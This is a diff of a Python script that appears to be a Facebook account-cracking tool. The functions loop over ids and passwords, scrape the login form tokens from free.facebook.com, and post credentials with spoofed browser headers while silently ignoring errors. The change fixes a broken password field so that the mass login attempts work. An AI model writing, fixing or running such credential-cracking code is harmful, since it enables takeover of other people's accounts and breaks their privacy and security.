@@ -792,7 +792,7 @@ def _M7_(ids,pasx):
                         else:continue
                 loop+=1
         except:pass
-#━━━━━━━━━━━━━[MATHOD━MOBILE━M6]━━━━━━━━━━━━━━━━#
+#━━━━━━━━━━━━━[MATHOD━MOBILE━M8]━━━━━━━━━━━━━━━━#
 
 def _M8_(ids,pasx):
         global loop
@@ -810,10 +810,10 @@ def _M8_(ids,pasx):
                         BLACKX = session.get('https://free.facebook.com/?_rdc=1&_rdr').text
                         apple ={'jazoest':re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
                         'lsd':re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
-                        'email': ids, 
+                        'email': ids,
+                        'pass': ps,
                         'login_source': 'comet_headerless_login', 
-                        'next': '', 
-                        'encpass': '#PWD_BROWSER':'0':re.search('name="lgnjs" value="(.*?)"', str(BLACKX)).group(1),:ps}
+                        'next': '',}
                         tedy ={'authority': 'web.facebook.com', 
                         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
                         'accept-language': 'en-US,en;q=0.9', 
